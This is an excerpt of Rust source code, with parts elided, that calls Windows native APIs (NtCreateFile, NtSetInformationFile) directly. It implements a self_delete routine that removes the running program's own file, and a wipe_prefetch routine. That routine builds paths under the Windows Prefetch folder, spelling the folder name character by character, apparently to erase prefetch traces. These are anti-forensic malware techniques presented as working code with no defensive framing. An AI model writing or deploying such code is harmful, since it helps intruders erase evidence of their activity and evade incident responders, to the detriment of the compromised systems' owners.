...
type NtCreateFileFn = unsafe extern "system" fn(
    *mut isize, *mut c_void, *mut c_void, *mut c_void,
    *mut c_void, u32, u32, u32, u32, *mut c_void, u32,
) -> i32;

type NtSetInformationFileFn = unsafe extern "system" fn(
    isize, *mut c_void, *mut c_void, u32, u32,
) -> i32;
...
#[repr(C)]
struct IoStatusBlock { st: i32, info: usize }

#[repr(C)]
struct FileDispInfoEx { flags: u32 }

#[repr(C)]
struct UnicodeStr { len: u16, max: u16, buf: *const u16 }

#[repr(C)]
struct ObjAttr {
    len: u32, root: isize, name: *const UnicodeStr,
    attrs: u32, sd: *mut c_void, qos: *mut c_void,
}
...
pub unsafe fn self_delete(path: &[u16]) -> bool {
    ...
    let us = UnicodeStr { len: (path.len() * 2) as u16, max: 256, buf: path.as_ptr() };
    let oa = ObjAttr {
        len: core::mem::size_of::<ObjAttr>() as u32,
        root: 0, name: &us, attrs: OBJ_CASE_INSENSITIVE,
        sd: core::ptr::null_mut(), qos: core::ptr::null_mut(),
    };
    ...
    let mut disp = FileDispInfoEx { flags: FILE_DISPOSITION_DELETE | FILE_DISPOSITION_POSIX_SEMANTICS };
    set_info(h, &mut iosb as *mut IoStatusBlock as *mut c_void,
...
pub unsafe fn wipe_prefetch(names: &[&[u16]]) {
    ...
    for name in names {
        ...
        let prefix: &[u16] = &[
            ...
            b'\\' as u16,b'P' as u16,b'r' as u16,b'e' as u16,b'f' as u16,b'e' as u16,b't' as u16,b'c' as u16,b'h' as u16,
            b'\\' as u16,
        ];
        let pl = prefix.len();
        ...
        let us = UnicodeStr { len: ((pl + name.len()) * 2) as u16, max: 256, buf: path.as_ptr() };
        let oa = ObjAttr {
            len: core::mem::size_of::<ObjAttr>() as u32,
            root: 0, name: &us, attrs: OBJ_CASE_INSENSITIVE,
            sd: core::ptr::null_mut(), qos: core::ptr::null_mut(),
